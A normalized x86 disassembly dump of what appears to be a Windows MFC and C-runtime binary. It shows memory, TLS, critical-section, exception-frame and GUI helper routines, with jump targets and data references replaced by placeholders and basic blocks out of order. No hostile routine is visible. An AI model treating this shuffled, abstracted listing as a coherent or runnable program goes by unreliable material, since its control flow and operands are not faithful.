jle r-xdata
mov eax [ esi + 0x10 ]
test [ eax + edi * 8 ] 0x1
je r-xdata
mov eax [ esi + 0x10 ]
add ebp 0x20
test eax eax
push ebx
jne r-xdata
mov eax [ esi + 0x10 ]
add eax 0x8
cmp edi [ esi + 0xc ]
jl r-xdata
push eax
call [ GlobalHandle@IAT ]
mov ebx eax
push ebx
call [ GlobalUnlock@IAT ]
mov eax ebp
push 0x2002
shl eax 0x3
push eax
push ebx
call [ GlobalReAlloc@IAT ]
mov eax ebp
shl eax 0x3
push eax
push 0x2002
call [ GlobalAlloc@IAT ]
jmp r-xdata
cmp edi ebp
jl r-xdata
inc edi
add eax 0x8
cmp edi ebp
jl r-xdata
mov eax [ esi + 0x10 ]
or [ eax + edi * 8 ] 0x1
push [ esp + 0x10 ]
lea eax [ eax + edi * 8 ]
lea eax [ edi + 0x1 ]
mov [ esi + 0x8 ] eax
call [ LeaveCriticalSection@IAT ]
mov eax edi
pop edi
pop esi
pop ebp
pop ecx
pop ecx
retn
lea eax [ edi + 0x1 ]
mov [ esi + 0xc ] eax
push [ esp + 0x10 ]
call ebx
mov ebx eax
mov eax [ esi + 0x4 ]
mov ecx eax
imul ecx ecx 0x1fffffff
add ecx ebp
lea eax [ ebx + eax * 8 ]
shl ecx 0x3
push ecx
push 0x0
push eax
call sub_4087f0
add esp 0xc
mov [ esi + 0x10 ] ebx
mov [ esi + 0x4 ] ebp
pop ebx
push [ esi + 0x10 ]
call [ GlobalHandle@IAT ]
push eax
call ebx
push [ esp + 0x14 ]
call [ LeaveCriticalSection@IAT ]
call sub_40e926
mov ebx [ GlobalLock@IAT ]
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
test [ eax ] 0x1
je r-xdata
sub_412bd1
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
lea eax [ edi + 0x1c ]
push eax
mov [ ebp - 0x4 ] eax
call [ EnterCriticalSection@IAT ]
mov esi [ edi + 0x14 ]
mov ebx [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax [ edi + 0x10 ]
push [ ebp - 0x4 ]
and [ eax + ebx * 8 ] 0xfffffffe
lea eax [ eax + ebx * 8 ]
call [ LeaveCriticalSection@IAT ]
pop edi
pop esi
pop ebx
leave
retn 0x4
cmp ebx [ esi + 0x8 ]
jge r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0xc ]
and [ eax + ebx * 4 ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_412c2e
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
push [ esi ]
call [ TlsGetValue@IAT ]
mov edi eax
test edi edi
je r-xdata
push 0x10
call sub_412a4b
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea ebx [ edi + 0x8 ]
cmp eax [ ebx ]
jl r-xdata
xor edi edi
mov [ eax ] r--data
mov edi eax
jmp r-xdata
mov eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
pop edi
pop esi
mov [ eax + edx * 4 ] ecx
pop ebx
leave
retn 0x8
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ esi + 0xc ]
push 0x2
shl ecx 0x2
push ecx
push eax
call [ LocalReAlloc@IAT ]
mov eax [ esi + 0xc ]
shl eax 0x2
push eax
push 0x0
call [ LocalAlloc@IAT ]
jmp r-xdata
and [ edi + 0x8 ] 0x0
and [ edi + 0xc ] 0x0
lea ebx [ edi + 0x8 ]
lea eax [ esi + 0x1c ]
push eax
mov [ ebp - 0x4 ] edi
call [ EnterCriticalSection@IAT ]
push edi
lea ecx [ esi + 0x14 ]
call sub_412a38
lea eax [ esi + 0x1c ]
push eax
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
mov eax [ ebx ]
mov ecx eax
imul ecx ecx 0x3fffffff
add ecx [ esi + 0xc ]
shl ecx 0x2
push ecx
mov ecx [ edi + 0xc ]
push 0x0
lea eax [ ecx + eax * 4 ]
push eax
call sub_4087f0
mov eax [ esi + 0xc ]
add esp 0xc
mov [ ebx ] eax
push edi
push [ esi ]
call [ TlsSetValue@IAT ]
call sub_40e926
test eax eax
mov [ edi + 0xc ] eax
jne r-xdata
mov eax [ edi + 0xc ]
test eax eax
jne r-xdata
sub_412d34
push esi
push edi
mov edi ecx
cmp [ edi ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov esi [ edi ]
push [ eax ]
call [ TlsGetValue@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
xor esi esi
cmp esi [ eax + 0x8 ]
jge r-xdata
call sub_412abf
mov [ edi ] eax
mov ecx rw-data
mov eax ecx
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
retn 0x4
call [ esp + 0xc ]
mov ecx [ rw-data ]
mov esi eax
push esi
push [ edi ]
call sub_412c2e
mov eax [ eax + 0xc ]
mov esi [ eax + esi * 4 ]
jmp r-xdata
xor ecx ecx
call sub_412a7d
mov ecx eax
jmp r-xdata
test esi esi
jne r-xdata
mov [ rw-data ] ecx
sub_412dab
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
and [ esi ] 0x0
pop esi
retn
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push eax
call sub_412bd1
sub_412dc9
mov eax sub_413a18
call sub_40d394
push ecx
push ecx
push ebx
push esi
push edi
mov esi ecx
xor edi edi
mov [ ebp - 0x10 ] esp
cmp [ esi ] edi
jne r-xdata
mov eax [ esi ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
push 0x10
call sub_413236
mov [ ebp - 0x4 ] edi
cmp [ esi ] edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x10
call sub_4132a6
call [ ebp + 0x8 ]
mov [ esi ] eax
sub_412e14
push 0x10
call sub_4132a6
xor edi edi
push edi
push edi
call sub_40cf90
push ebp
mov ebp esp
push ecx
cmp [ ecx ] 0x0
je r-xdata
leave
retn
mov eax [ ecx ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_412e7b
mov eax sub_413a2c
call sub_40d394
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0xcc ]
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xcc ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x30 ]
mov edi [ UnhookWindowsHookEx@IAT ]
test eax eax
je r-xdata
mov eax [ ecx ]
call [ eax + 0x58 ]
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov esi [ esi + 0xc ]
test esi esi
je r-xdata
push eax
call edi
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push esi
call sub_404e2a
pop ecx
sub_412f20
mov eax ecx
xor edx edx
lea ecx [ eax + 0x103c ]
mov [ eax + 0x1c ] edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
mov [ eax + 0x28 ] edx
mov [ ecx ] edx
mov [ ecx + 0x4 ] edx
or [ eax + 0x104c ] 0xffffffff
lea ecx [ eax + 0x1048 ]
mov [ ecx + 0x8 ] edx
mov [ ecx + 0x1c ] edx
mov [ ecx + 0x20 ] edx
mov cl [ esp + 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x28 ] 0x1c
mov [ eax + 0x20 ] 0x14
mov [ eax + 0x18 ] edx
mov [ eax + 0x14 ] cl
mov [ eax + 0x30 ] 0x1
mov [ eax + 0x1040 ] 0x18
retn 0x4
sub_412f9e
mov eax sub_413a4e
call sub_40d394
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x1044 ]
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
mov ecx [ esi + 0x106c ]
lea edi [ esi + 0x106c ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x1070 ]
call sub_412dab
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ecx ]
lea edx [ esi + 0x1048 ]
push edx
call [ eax + 0xc ]
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_413052
mov eax sub_413a60
call sub_40d394
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push 0x1
test ecx ecx
pop ebx
je r-xdata
mov ecx [ esi + 0x18 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x30 ]
test ecx ecx
je r-xdata
cmp [ ecx + 0xc ] 0x0
je r-xdata
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
call sub_40e978
push eax
call sub_40ecc0
pop ecx
mov ecx [ esi + 0x38 ]
jmp r-xdata
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
sub_413117
mov ecx rw-data
jmp r-xdata
jmp r-xdata
push ebp
mov ebp esp
push ecx
cmp [ ecx ] 0x0
je r-xdata
leave
retn
mov eax [ ecx ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_413179
push esi
push 0x1074
call sub_412a4b
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push 0x1
mov ecx esi
call sub_412f20
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_4131f1
cmp [ rw-data ] 0x0
push esi
jne r-xdata
mov eax [ rw-data ]
pop esi
retn
push 0x1
pop esi
mov [ rw-data ] esi
call [ GetVersion@IAT ]
cmp al 0x4
jae r-xdata
and [ rw-data ] 0x0
push rw-data
call [ InitializeCriticalSection@IAT ]
test eax 0x80000000
je r-xdata
mov [ rw-data ] esi
jmp r-xdata
sub_413236
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
call sub_4131f1
pop ebx
retn 0x4
push esi
push edi
mov edi [ esp + 0x10 ]
cmp [ edi * 4 + rw-data ] ebx
mov ebx [ EnterCriticalSection@IAT ]
lea esi [ edi * 4 + rw-data ]
jne r-xdata
lea eax [ edi + edi * 2 ]
lea eax [ eax * 8 + rw-data ]
push eax
call ebx
pop edi
pop esi
push ebp
mov ebp rw-data
push ebp
call ebx
cmp [ esi ] 0x0
jne r-xdata
push ebp
call [ LeaveCriticalSection@IAT ]
pop ebp
lea eax [ edi + edi * 2 ]
lea eax [ eax * 8 + rw-data ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi ]
sub_4132cd
push ebp
mov ebp esp
sub esp 0x90
push ebx
push esi
push edi
call [ GetMenuCheckMarkDimensions@IAT ]
movsx ebx ax
shr eax 0x10
movsx ecx ax
cmp ebx 0x20
mov [ ebp - 0xc ] ecx
jle r-xdata
lea eax [ ebx - 0x4 ]
lea esi [ ebx + 0xf ]
cdq
sub eax edx
sar esi 0x4
mov edi eax
mov eax esi
sar edi 0x1
shl eax 0x4
add edi eax
sub edi ebx
cmp edi 0xc
jle r-xdata
push 0x20
pop ebx
push 0x20
pop eax
cmp ecx eax
jle r-xdata
push 0xc
pop edi
push 0x80
lea eax [ ebp - 0x90 ]
push 0xff
push eax
call sub_4087f0
mov eax [ ebp - 0xc ]
add esp 0xc
add eax 0xfffffffa
mov [ ebp - 0x4 ] r--data
sar eax 0x1
imul eax esi
add esi esi
mov [ ebp - 0x8 ] 0x5
lea edx [ ebp + eax * 2 - 0x90 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx edi
movzx ax [ eax ]
shl eax cl
inc [ ebp - 0x4 ]
xor ecx ecx
not eax
mov cl ah
mov [ edx + 0x1 ] al
mov [ edx ] cl
add edx esi
dec [ ebp - 0x8 ]
jne r-xdata
lea eax [ ebp - 0x90 ]
push eax
push 0x1
push 0x1
push [ ebp - 0xc ]
push ebx
call [ CreateBitmap@IAT ]
pop edi
pop esi
test eax eax
mov [ rw-data ] eax
pop ebx
jne r-xdata
leave
retn
push 0x7fe3
push eax
call [ LoadBitmapA@IAT ]
mov [ rw-data ] eax
sub_4133ad
mov eax sub_413b41
call sub_40d394
push ecx
push 0x3c
call sub_40ec97
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_40f700
sub_4133e5
mov eax sub_413b56
call sub_40d394
push ecx
push esi
mov ecx rw-data
call sub_40c998
mov esi eax
mov [ ebp - 0x10 ] esi
xor eax eax
cmp esi eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov ecx esi
call sub_40f700
mov [ esi ] r--data
mov eax esi
sub_413490
mov eax sub_413b69
call sub_40d394
push ecx
push 0x10
call sub_412a4b
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_41365b
sub_4134c1
mov eax sub_413b7c
call sub_40d394
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push 0x0
call eax
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push esi
call [ FreeLibrary@IAT ]
sub_41356e
cmp [ rw-data ] 0x0
je r-xdata
retn
push esi
mov esi [ GetSystemMetrics@IAT ]
push 0x2
call esi
inc eax
push 0x3
mov [ rw-data ] eax
call esi
inc eax
mov [ rw-data ] 0x1
mov [ rw-data ] eax
pop esi
sub_4135c0
push ebx
push esi
push edi
mov esi ecx
call [ GetVersion@IAT ]
xor ecx ecx
push 0x1
mov cl ah
movzx edx al
movzx ecx cl
shl edx 0x8
add ecx edx
mov [ esi + 0x54 ] ecx
mov ecx eax
shr ecx 0x1f
cmp al 0x4
mov [ esi + 0x58 ] ecx
sbb eax eax
pop ecx
inc eax
xor ebx ebx
sub ecx eax
cmp eax ebx
mov [ esi + 0x5c ] eax
mov [ esi + 0x60 ] ecx
mov [ esi + 0x64 ] eax
mov [ esi + 0x68 ] ebx
je r-xdata
mov ecx esi
call sub_411e21
mov ecx esi
mov [ esi + 0x24 ] ebx
call sub_411ddd
mov edi [ LoadCursorA@IAT ]
push 0x7f02
push ebx
call edi
push 0x7f00
push ebx
mov [ esi + 0x3c ] eax
call edi
mov [ esi + 0x40 ] eax
xor eax eax
cmp [ esi + 0x5c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x44 ] ebx
pop edi
setne al
inc eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov eax esi
pop esi
pop ebx
retn
push ebx
call [ GetProcessVersion@IAT ]
cmp eax 0x40000
sbb eax eax
inc eax
mov [ esi + 0x68 ] eax
sub_4136a0
push ebp
mov ebp esp
sub esp 0x14
lea eax [ ebp - 0x14 ]
push eax
call [ GetOEMCP@IAT ]
push eax
call [ GetCPInfo@IAT ]
push 0x1
pop eax
cmp eax [ ebp - 0x14 ]
sbb eax eax
neg eax
leave
retn
sub_41384b
push esi
mov ecx rw-data
call sub_40c998
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop esi
retn
mov ecx esi
call sub_4121c6
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_413991
mov eax sub_413bdc
call sub_40d394
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
add ecx 0x4
push ecx
call sub_412125
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_4011a0
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
push eax
call sub_401000
add esp 0x4
test eax eax
je r-xdata
jmp sub_4010b0
mov eax 0x1
retn
jmp sub_4010b0
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
sub_403c3f
cmp [ rw-data ] 0x1
jne r-xdata
push [ esp + 0x4 ]
call sub_406969
pop ecx
push 0xff
call [ ExitProcess@IAT ]
call sub_406930
sub_403c63
push esi
mov esi [ InitializeCriticalSection@IAT ]
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
pop esi
retn
sub_4040da
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xfffffffd
call sub_403d02
pop ecx
mov [ rw-data ] 0x1
sub_404af8
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
retn
sub_404b05
mov eax [ esp + 0x4 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
retn
sub_404b15
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
retn
sub_404c50
mov eax [ esp + 0x4 ]
mov [ eax + 0x50 ] rw-data
mov [ eax + 0x14 ] 0x1
retn
sub_404d72
call sub_405036
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp sub_4072d2
sub_405036
push 0x1
call sub_40503f
pop ecx
retn
sub_405e3d
mov eax [ rw-data ]
test eax eax
je r-xdata
push rw-data
push rw-data
call sub_405f43
push rw-data
push rw-data
call sub_405f43
add esp 0x10
retn
call eax
sub_405e6a
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_405e8c
add esp 0xc
retn
sub_405f31
push 0xd
call sub_403c8c
pop ecx
retn
sub_405f3a
push 0xd
call sub_403ced
pop ecx
retn
sub_406780
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40680a
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_406780
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_406836
push ebx
push ecx
mov ebx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_406915
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_4067a2
add esp 0x8
pop ebp
retn 0x4
sub_406c58
push 0x1
pop eax
retn
sub_406d0c
push 0x1
pop eax
retn
sub_406e90
push 0x1
pop eax
retn
sub_408151
mov eax [ esp + 0x4 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax * 4 + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
retn
sub_4084d5
push 0x4
push 0x0
push [ esp + 0xc ]
call sub_4084e6
add esp 0xc
retn
sub_4089cf
push 0x2
call sub_403c1a
pop ecx
retn
sub_4093a0
mov eax [ esp + 0x4 ]
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
and eax 0xff
shr eax 0x4
and eax 0x1
retn
xor eax eax
retn
sub_409a40
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
jne r-xdata
push eax
call sub_40a140
add esp 0x4
xor eax eax
retn
or eax 0xffffffff
retn
sub_409a60
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
jne r-xdata
push eax
call sub_40a1e0
add esp 0x4
xor eax eax
retn
or eax 0xffffffff
retn
sub_409a80
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_409a90
mov [ rw-data ] 0x0
retn
sub_40a120
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn
push eax
call [ CloseHandle@IAT ]
mov eax [ esp + 0x8 ]
push eax
call sub_409c50
pop ecx
sub_40adb0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push rw-data
push ecx
call sub_40ace0
add esp 0xc
retn
sub_40ae30
mov eax [ ecx + 0x8 ]
retn
sub_40ae40
mov eax [ ecx + 0x8 ]
mov ecx [ esp + 0x4 ]
lea eax [ eax + ecx * 8 + 0x78 ]
retn 0x4
sub_40b5c0
mov eax [ esp + 0x4 ]
push eax
call sub_404e2a
pop ecx
retn
sub_40c22d
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push [ esp + 0x4 ]
call sub_404e2a
pop ecx
xor eax eax
retn
or eax 0xffffffff
retn
sub_40c399
push 0x1
push rw-data
push [ esp + 0xc ]
call sub_40c300
add esp 0xc
push 0x1
pop eax
retn
sub_40c3b0
push 0x2
push rw-data
push [ esp + 0xc ]
call sub_40c300
add esp 0xc
push 0x2
pop eax
retn
sub_40c41f
push 0x1
push rw-data
push [ esp + 0xc ]
call sub_40c300
add esp 0xc
push 0x1
pop eax
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
CheckTokenMembership
jmp [ CheckTokenMembership@IAT ]
sub_40c878
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_40eccb
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_40c8a2
push esi
mov esi ecx
call sub_40c8be
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40ecc0
pop ecx
sub_40c8be
mov [ ecx ] r--data
retn
sub_40c8c5
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_40eccb
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_40c8ef
push esi
mov esi ecx
call sub_40c90b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40ecc0
pop ecx
sub_40c90b
mov [ ecx ] r--data
retn
sub_40c912
push [ esp + 0x4 ]
call sub_40ecc0
pop ecx
retn 0x4
sub_40c91f
call sub_40f15e
test eax eax
je r-xdata
xor eax eax
retn
mov edx [ eax ]
mov ecx eax
call [ edx + 0x74 ]
retn
sub_40c933
retn
sub_40c95c
push esi
mov esi ecx
call sub_40c970
add esi 0x10
push esi
call [ DeleteCriticalSection@IAT ]
pop esi
retn
sub_40cc7f
mov eax [ ecx + 0x20 ]
test eax eax
jne r-xdata
push eax
call sub_40fa9e
retn
push [ ecx + 0x1c ]
call [ GetParent@IAT ]
sub_40cc96
retn 0x4
sub_40cc99
push 0x0
push [ ecx + 0x1c ]
call [ EnableWindow@IAT ]
retn
sub_40cca5
push 0x1
push [ ecx + 0x1c ]
call [ EnableWindow@IAT ]
retn
sub_40ccb1
call sub_413126
mov ecx [ eax + 0x4 ]
jmp sub_40f3f1
sub_40ccbe
push esi
mov esi ecx
call sub_40ccda
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40ecc0
pop ecx
sub_40cd22
push esi
mov esi ecx
call sub_40cd3e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40ecc0
pop ecx
sub_40cd3e
mov eax sub_413c18
call sub_40d394
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_411ff5
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_40cd67
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_40eccb
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_40cd91
push esi
mov esi ecx
call sub_40cdad
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40ecc0
pop ecx
sub_40cdad
mov [ ecx ] r--data
retn
sub_40cdb4
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_40eccb
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_40cdde
push esi
mov esi ecx
call sub_40cdfa
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40ecc0
pop ecx
sub_40cdfa
mov [ ecx ] r--data
retn
sub_40ce01
push esi
mov esi ecx
call sub_40ce1d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40ecc0
pop ecx
sub_40ce1d
mov eax sub_413c7c
call sub_40d394
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_412720
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_40ce46
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push [ ecx + 0x4 ]
call [ PtVisible@IAT ]
retn 0x8
sub_40ce5a
push [ esp + 0x4 ]
push [ ecx + 0x4 ]
call [ RectVisible@IAT ]
retn 0x4
sub_40ce6a
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ TextOutA@IAT ]
retn 0x10
sub_40cee3
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ DrawTextA@IAT ]
retn 0x10
sub_40cf2f
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ Escape@IAT ]
retn 0x10
sub_40cf74
push esi
mov esi ecx
call sub_40cf4b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40ecc0
pop ecx
sub_40cff4
push [ esp + 0x4 ]
call sub_40cfca
pop ecx
retn
sub_40d0e0
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_40d0e7
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_40d30f
push 0x1
pop eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40d394
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
sub_40d431
push [ esp + 0x4 ]
call sub_40d3b3
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_40d574
push sub_40d52e
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rw-data ] eax
retn
sub_40d585
push [ rw-data ]
call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_40d94e
push [ ebp - 0x14 ]
call sub_40d985
pop ecx
retn
sub_40d985
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
je r-xdata
jmp sub_40ddfc
xor eax eax
retn
sub_40dabb
push [ ebp - 0x14 ]
call sub_40db31
pop ecx
retn
sub_40dd13
push 0x1
pop eax
retn
sub_40dd17
mov esp [ ebp - 0x18 ]
jmp sub_40ddfc
sub_40dd75
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_40dd7e
mov esp [ ebp - 0x18 ]
jmp sub_40ddfc
sub_40de44
push 0x1
pop eax
retn
sub_40de9a
push 0x1
